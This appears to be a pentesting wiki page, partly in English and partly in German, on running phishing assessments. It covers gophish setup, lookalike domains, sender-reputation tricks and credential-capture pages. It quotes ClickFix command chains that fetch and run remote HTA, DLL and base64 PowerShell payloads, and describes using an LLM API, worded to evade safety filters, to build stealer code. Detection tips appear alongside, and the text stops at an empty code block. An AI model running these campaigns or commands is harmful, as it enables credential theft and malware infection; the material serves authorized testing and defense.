# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguration

**TLS-Zertifikatskonfiguration**

Vor diesem Schritt solltest du die **Domain bereits gekauft** haben, die du verwenden wirst, und sie muss auf die **IP des VPS** **zeigen**, auf dem du **gophish** konfigurierst.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Start installing: `apt-get install postfix`

Then add the domain to the following files:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**

Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`

Now lets test to send an email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-Konfiguration**

Stoppe die Ausführung von gophish und lass es uns konfigurieren.\
Ändere `/opt/gophish/config.json` zu folgendem (beachte die Verwendung von https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfiguriere den gophish service**

Um den gophish service zu erstellen, damit er automatisch gestartet und als service verwaltet werden kann, kannst du die Datei `/etc/init.d/gophish` mit folgendem Inhalt erstellen:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Beende die Konfiguration des Dienstes und überprüfe ihn, indem du Folgendes ausführst:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mailserver und Domain konfigurieren

### Warten & legitim wirken

Je älter eine Domain ist, desto geringer ist die Wahrscheinlichkeit, dass sie als Spam erkannt wird. Daher solltest du vor der Phishing-Bewertung so lange wie möglich warten (mindestens 1 Woche). Außerdem: Wenn du eine Seite zu einem reputationsstarken Sektor einrichtest, wird die erzielte Reputation besser.

Beachte, dass du zwar eine Woche warten musst, aber die gesamte Konfiguration jetzt schon abschließen kannst.

### Reverse DNS (rDNS) Record konfigurieren

Setze einen rDNS (PTR) Record, der die IP-Adresse der VPS auf den Domainnamen auflöst.

### Sender Policy Framework (SPF) Record

Du musst **einen SPF Record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein SPF Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Du kannst [https://www.spfwizard.net/](https://www.spfwizard.net) verwenden, um deine SPF-Policy zu generieren (verwende die IP der VPS-Maschine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Dies ist der Inhalt, der in einem TXT Record innerhalb der Domain gesetzt werden muss:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Du musst **einen DMARC-Record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC-Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Du musst einen neuen DNS-TXT-Record erstellen, der auf den Hostnamen `_dmarc.<domain>` zeigt, mit folgendem Inhalt:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Du musst **eine DKIM für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC-Record ist [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Dieses Tutorial basiert auf: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Du musst beide B64-Werte aneinanderhängen, die der DKIM-Key generiert:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Teste deinen E-Mail-Konfigurationsscore

Du kannst das mit [https://www.mail-tester.com/](https://www.mail-tester.com) machen\
Greife einfach auf die Seite zu und sende eine E-Mail an die Adresse, die sie dir geben:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Sie können auch **Ihre E-Mail-Konfiguration überprüfen**, indem Sie eine E-Mail an `check-auth@verifier.port25.com` senden und **die Antwort lesen** (dafür müssen Sie Port **25** **öffnen** und die Antwort in der Datei _/var/mail/root_ ansehen, wenn Sie die E-Mail als root senden).\
Stellen Sie sicher, dass Sie alle Tests bestehen:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Du könntest auch eine **Nachricht an ein Gmail unter deiner Kontrolle senden** und die **E-Mail-Header** in deinem Gmail-Posteingang prüfen; `dkim=pass` sollte im `Authentication-Results`-Headerfeld vorhanden sein.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Entfernen von der Spamhaus-Blacklist

Die Seite [www.mail-tester.com](https://www.mail-tester.com) kann dir anzeigen, ob deine Domain von Spamhaus blockiert wird. Du kannst beantragen, dass deine Domain/IP entfernt wird unter: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Entfernen von der Microsoft-Blacklist

​​Du kannst beantragen, dass deine Domain/IP entfernt wird unter [https://sender.office.com/](https://sender.office.com).

## GoPhish-Kampagne erstellen & starten

### Sending Profile

- Setze einen **Namen zur Identifizierung** des Sender-Profils
- Entscheide, von welchem Konto aus du die Phishing-E-Mails senden willst. Vorschläge: _noreply, support, servicedesk, salesforce..._
- Du kannst Username und Password leer lassen, stelle aber sicher, dass du **Ignore Certificate Errors** aktivierst

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Es wird empfohlen, die Funktion "**Send Test Email**" zu verwenden, um zu testen, ob alles funktioniert.\
> Ich würde empfehlen, die **Test-E-Mails an 10min-Mail-Adressen** zu senden, um zu vermeiden, dass du bei Tests auf Blacklists landest.

### Email Template

- Setze einen **Namen zur Identifizierung** der Vorlage
- Schreibe dann einen **Betreff** (nichts Seltsames, einfach etwas, das man in einer normalen E-Mail erwarten würde)
- Stelle sicher, dass du "**Add Tracking Image**" aktiviert hast
- Schreibe die **E-Mail-Vorlage** (du kannst Variablen wie im folgenden Beispiel verwenden):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Beachten Sie, dass **um die Glaubwürdigkeit der E-Mail zu erhöhen**, empfohlen wird, eine Signatur aus einer E-Mail des Kunden zu verwenden. Vorschläge:

- Senden Sie eine E-Mail an eine **nicht existierende Adresse** und prüfen Sie, ob die Antwort eine Signatur enthält.
- Suchen Sie nach **öffentlichen E-Mails** wie info@ex.com oder press@ex.com oder public@ex.com und senden Sie ihnen eine E-Mail; warten Sie auf die Antwort.
- Versuchen Sie, eine **irgendwie gültig entdeckte** E-Mail zu kontaktieren und warten Sie auf die Antwort

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Das Email Template ermöglicht auch, **Dateien zum Senden anzuhängen**. Wenn Sie auch NTLM-Challenges mit einigen speziell präparierten Dateien/Dokumenten stehlen möchten, [lesen Sie diese Seite](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Schreiben Sie einen **Namen**
- **Schreiben Sie den HTML-Code** der Webseite. Beachten Sie, dass Sie Webseiten **importieren** können.
- Markieren Sie **Capture Submitted Data** und **Capture Passwords**
- Setzen Sie eine **Weiterleitung**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalerweise müssen Sie den HTML-Code der Seite anpassen und lokal einige Tests machen (vielleicht mit einem Apache-Server), **bis Ihnen die Ergebnisse gefallen.** Dann schreiben Sie diesen HTML-Code in das Feld.\
> Beachten Sie, dass Sie, falls Sie **statische Ressourcen** für das HTML verwenden müssen (vielleicht einige CSS- und JS-Seiten), diese in _**/opt/gophish/static/endpoint**_ speichern und dann über _**/static/\<filename>**_ darauf zugreifen können

> [!TIP]
> Für die Weiterleitung könnten Sie die Benutzer auf die legitime Hauptwebseite des Opfers **weiterleiten** oder sie zum Beispiel auf _/static/migration.html_ weiterleiten, ein **Lade-Symbol (**[**https://loading.io/**](https://loading.io)**) für 5 Sekunden anzeigen und dann angeben, dass der Vorgang erfolgreich war**.

### Users & Groups

- Setzen Sie einen Namen
- **Importieren Sie die Daten** (beachten Sie, dass Sie für die Verwendung der Vorlage im Beispiel Vorname, Nachname und E-Mail-Adresse jedes Benutzers benötigen)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Erstellen Sie schließlich eine Campaign, indem Sie einen Namen, die Email Template, die Landing Page, die URL, das Sending Profile und die Gruppe auswählen. Beachten Sie, dass die URL der Link ist, der an die Opfer gesendet wird

Beachten Sie, dass das **Sending Profile es ermöglicht, eine Test-E-Mail zu senden, um zu sehen, wie die finale phishing E-Mail aussehen wird**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Ich würde empfehlen, die **Test-E-Mails an 10min-Mail-Adressen zu senden**, um beim Testen nicht auf Blacklists zu landen.

Sobald alles bereit ist, starten Sie einfach die Campaign!

## Website Cloning

Wenn Sie aus irgendeinem Grund die Webseite klonen möchten, prüfen Sie die folgende Seite:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bei einigen phishing-Bewertungen (hauptsächlich für Red Teams) möchten Sie vielleicht auch **Dateien senden, die irgendeine Art von Backdoor enthalten** (vielleicht ein C2 oder vielleicht einfach etwas, das eine Authentifizierung auslöst).\
Sehen Sie sich die folgende Seite für einige Beispiele an:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Der vorherige Angriff ist ziemlich clever, da Sie eine echte Webseite vortäuschen und die vom Benutzer eingegebenen Informationen einsammeln. Leider gilt: Wenn der Benutzer nicht das richtige Passwort eingegeben hat oder die gefälschte Anwendung mit 2FA konfiguriert ist, **erlauben diese Informationen nicht, den getäuschten Benutzer zu impersonieren**.

Hier sind Tools wie [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) und [**muraena**](https://github.com/muraenateam/muraena) nützlich. Dieses Tool ermöglicht Ihnen, einen MitM-ähnlichen Angriff zu erzeugen. Grundsätzlich funktioniert der Angriff wie folgt:

1. Sie **imitieren das Login**-Formular der echten Webseite.
2. Der Benutzer **sendet** seine **Zugangsdaten** an Ihre gefälschte Seite und das Tool sendet diese an die echte Webseite und **prüft, ob die Zugangsdaten funktionieren**.
3. Wenn das Konto mit **2FA** konfiguriert ist, fragt die MitM-Seite danach, und sobald der **Benutzer** es eingibt, sendet das Tool es an die echte Webseite.
4. Sobald der Benutzer authentifiziert ist, haben Sie als Angreifer **die Zugangsdaten, die 2FA, das Cookie und alle Informationen** jeder Interaktion abgefangen, während das Tool einen MitM durchführt.

### Via VNC

Was ist, wenn Sie das Opfer statt auf eine bösartige Seite mit dem gleichen Aussehen wie die ursprüngliche Seite zu schicken, es zu einer **VNC-Session mit einem Browser auf der echten Webseite** schicken? Sie können sehen, was es tut, das Passwort stehlen, die verwendete MFA, die Cookies...\
Sie können dies mit [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) tun

## Detecting the detection

Offensichtlich ist eine der besten Möglichkeiten zu erkennen, ob Sie aufgeflogen sind, Ihre Domain in **Blacklists** zu suchen. Wenn sie dort gelistet ist, wurde Ihre Domain irgendwie als verdächtig erkannt.\
Eine einfache Möglichkeit zu prüfen, ob Ihre Domain in einer Blacklist erscheint, ist die Nutzung von [https://malwareworld.com/](https://malwareworld.com)

Es gibt jedoch andere Möglichkeiten zu erkennen, ob das Opfer **aktiv nach verdächtiger phishing-Aktivität im Internet sucht**, wie hier erklärt:


{{#ref}}
detecting-phising.md
{{#endref}}

Sie können eine Domain mit einem dem Domainnamen des Opfers **sehr ähnlichen Namen kaufen** und/oder ein Zertifikat für eine **Subdomain** einer von Ihnen kontrollierten Domain **erstellen**, die das **Keyword** der Domain des Opfers **enthält**. Wenn das **Opfer** irgendeine Art von **DNS- oder HTTP-Interaktion** damit durchführt, wissen Sie, dass es **aktiv nach** verdächtigen Domains sucht, und Sie müssen sehr unauffällig sein.

### Evaluate the phishing

Verwenden Sie [**Phishious** ](https://github.com/Rices/Phishious), um zu bewerten, ob Ihre E-Mail im Spam-Ordner landen wird oder ob sie blockiert wird oder erfolgreich ist.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne Intrusion-Sets überspringen zunehmend E-Mail-Lures vollständig und **zielen direkt auf den Service-Desk-/Identity-Recovery-Workflow ab**, um MFA zu umgehen. Der Angriff ist vollständig "living-off-the-land": Sobald der Operator gültige Zugangsdaten besitzt, wechselt er mit integrierten Admin-Tools – Malware ist nicht erforderlich.

### Attack flow
1. Aufklärung des Opfers
* Sammeln Sie persönliche und Unternehmensdaten von LinkedIn, Datenlecks, öffentlichem GitHub usw.
* Identifizieren Sie hochwertige Identitäten (Führungskräfte, IT, Finanzen) und ermitteln Sie den **genauen Help-Desk-Prozess** für Passwort- / MFA-Reset.
2. Social Engineering in Echtzeit
* Rufen Sie den Help-Desk per Telefon, Teams oder Chat an und geben Sie sich als das Ziel aus (oft mit **gespoofter Caller-ID** oder **geklonter Stimme**).
* Geben Sie die zuvor gesammelten PII an, um die wissensbasierte Verifikation zu bestehen.
* Überzeugen Sie den Mitarbeiter, das **MFA-Secret zurückzusetzen** oder einen **SIM-Swap** auf einer registrierten Mobilnummer durchzuführen.
3. Sofortige Maßnahmen nach dem Zugriff (≤60 Min. in realen Fällen)
* Verschaffen Sie sich einen Fuß in der Tür über ein beliebiges Web-SSO-Portal.
* Enumerieren Sie AD / AzureAD mit integrierten Mitteln (keine Binärdateien abgelegt):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Laterale Bewegung mit **WMI**, **PsExec** oder legitimen **RMM**-Agents, die in der Umgebung bereits auf der Allowlist stehen.

### Detection & Mitigation
* Behandeln Sie die Identity-Recovery des Help-Desks als **privilegierte Operation** – erfordern Sie Step-up-Auth und Genehmigung durch einen Vorgesetzten.
* Implementieren Sie **Identity Threat Detection & Response (ITDR)** / **UEBA**-Regeln, die Alarm auslösen bei:
* Geänderter MFA-Methoden + Authentifizierung von neuem Gerät / neuer Geo.
* Sofortige Eskalation desselben Principals (user-→-admin).
* Zeichnen Sie Help-Desk-Anrufe auf und erzwingen Sie einen **Rückruf an eine bereits registrierte Nummer**, bevor ein Reset erfolgt.
* Implementieren Sie **Just-In-Time (JIT) / Privileged Access**, damit neu zurückgesetzte Konten **nicht** automatisch High-Privilege-Tokens erben.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity-Gruppen kompensieren die Kosten von High-Touch-Operationen mit Massenangriffen, die **Suchmaschinen & Ad-Netzwerke zum Lieferkanal** machen.

1. **SEO poisoning / malvertising** schiebt ein gefälschtes Ergebnis wie `chromium-update[.]site` in die Top-Suchergebnisse.
2. Das Opfer lädt einen kleinen **First-Stage Loader** herunter (oft JS/HTA/ISO). Beispiele, die von Unit 42 gesehen wurden:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Der Loader exfiltriert Browser-Cookies + Credential-DBs und lädt dann einen **silent loader**, der – *in realtime* – entscheidet, ob ausgerollt wird:
* RAT (z. B. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blockieren Sie neu registrierte Domains und erzwingen Sie **Advanced DNS / URL Filtering** für *search-ads* sowie für E-Mail.
* Beschränken Sie die Softwareinstallation auf signierte MSI- / Store-Pakete; verweigern Sie per Richtlinie die Ausführung von `HTA`, `ISO`, `VBS`.
* Überwachen Sie untergeordnete Prozesse von Browsern, die Installer öffnen:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Jagen Sie nach LOLBins, die häufig von First-Stage-Loaders missbraucht werden (z. B. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Manche gefälschten Software-Portale lassen das sichtbare Download-`href` auf die **echte** GitHub-/Release-URL zeigen, hijacken aber die **erste** Benutzerinteraktion in JavaScript und leiten das Opfer stattdessen in eine **Traffic Distribution System (TDS)**-Kette weiter.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Wichtige Merkmale:
- Der Hook läuft normalerweise in der **capture phase** (`true`) auf `document`, sodass er vor den Handlern der Site auslöst.
- Chrome verwendet oft `mousedown` statt `click`, um den Redirect an eine gültige **user gesture** zu binden und das Umgehen von Popup-Blockern zu verbessern.
- Manche Varianten öffnen vorab `about:blank` oder synthetisieren `<a target="_blank">`-Klicks und weisen erst später die TDS-URL zu.
- Caps auf Browser-Seite liegen häufig in `localStorage`, daher kann der **erste Klick** Malware erreichen, während Refreshes/Wiederholungen auf den harmlos wirkenden sichtbaren Link zurückfallen.
- Das TDS kann nach referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context und per-session counters filtern, wodurch Analysten-Replays nicht deterministisch werden.

Defender-Ideen:
- Vergleiche das **angezeigte** `href` mit dem **tatsächlichen** Navigation-Ziel, das zur Klickzeit erzeugt wird.
- Suche nach `document.addEventListener(..., true)`-Handlern, die sowohl `preventDefault()` als auch `stopImmediatePropagation()` rund um `window.open`, `about:blank` oder synthetische Anchor-Klicks aufrufen.
- Behandle Cluster neu registrierter software-download domains, die alle dieselbe CloudFront/JS-Stage laden, als hochsignifikantes SEO-poisoning/TDS-Muster.

### ClickFix von Fake-Verifizierungsseiten + archive-ähnliche LOLBAS fetches
Einige TDS-Branches enden auf einer Fake-Verifizierungsseite (Cloudflare/IUAM-Stil), die das Opfer auffordert, ein vertrauenswürdiges Windows-Binary auszuführen, wie zum Beispiel:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` führt das **HTA/VBScript am Anfang der Antwort** aus, selbst wenn die URL vorgibt, ein `.7z`-Archiv zu sein; angehängte Archivdaten können reiner Köder sein.
- Nachfolgende Stufen lügen oft weiter über den Dateityp (`.rtf` für PowerShell, `.asar` für Python, ZIPs mit gepaddeten Binärdateien) und wechseln dann zu **manual PE mapping / in-memory execution**.
- Wenn du auf eine dieser Ketten antwortest, bewahre **Netzwerk + memory aus dem ersten erfolgreichen Run**: spätere Replays zeigen möglicherweise nur einen harmlosen Installer/SFX-Pfad oder scheitern, weil die Nutzlast/Key-Freigabe an die ursprüngliche TDS-Session gebunden war.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lockmittel: geklonte nationale CERT Advisory mit einem **Update**-Button, der schrittweise „fix“-Anweisungen anzeigt. Opfern wird gesagt, sie sollen eine batch ausführen, die eine DLL herunterlädt und sie via `rundll32` ausführt.
* Typische beobachtete batch-Kette:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` legt die Nutzlast in `%TEMP%` ab, ein kurzes Sleep verschleiert Network Jitter, dann ruft `rundll32` den exportierten Entry Point (`notepad`) auf.
* Die DLL beaconed Host-Identität und pollt C2 alle paar Minuten. Remote Tasking kommt als **base64-encodiertes PowerShell**, ausgeführt hidden und mit policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Das erhält C2-Flexibilität (der Server kann Tasks austauschen, ohne die DLL zu aktualisieren) und verbirgt Konsolenfenster. Suche nach PowerShell-Children von `rundll32.exe` mit `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` zusammen.
* Defenders können nach HTTP(S)-Callbacks der Form `...page.php?tynor=<COMPUTER>sss<USER>` und 5-Minuten-Polling-Intervallen nach dem DLL-Load suchen.

---

## AI-Enhanced Phishing Operations
Angreifer verketten jetzt **LLM- & voice-clone-APIs** für vollständig personalisierte Lockmittel und Echtzeit-Interaktion.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS mit randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Füge **dynamic banners** hinzu, die Nachrichten hervorheben, die von untrusted automation gesendet wurden (via ARC/DKIM anomalies).
• Setze **voice-biometric challenge phrases** für hochriskante Telefonanfragen ein.
• Simuliere kontinuierlich AI-generierte Lockmittel in Awareness-Programmen – statische Templates sind obsolet.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Angreifer können harmlos aussehendes HTML ausliefern und den stealer zur Laufzeit **generieren**, indem sie eine **trusted LLM API** nach JavaScript fragen und es dann im Browser ausführen (z.B. `eval` oder dynamisches `<script>`).

1. **Prompt-as-obfuscation:** kodiere Exfil-URLs/Base64-Strings in den Prompt; variiere das Wording, um Safety-Filter zu umgehen und Halluzinationen zu reduzieren.
2. **Client-side API call:** Beim Laden ruft JS ein öffentliches LLM (Gemini/DeepSeek/etc.) oder einen CDN-Proxy auf; im statischen HTML ist nur der Prompt/API-Call vorhanden.
3. **Assemble & exec:** verbinde die Antwort und führe sie aus (polymorph pro Besuch):
```javascript
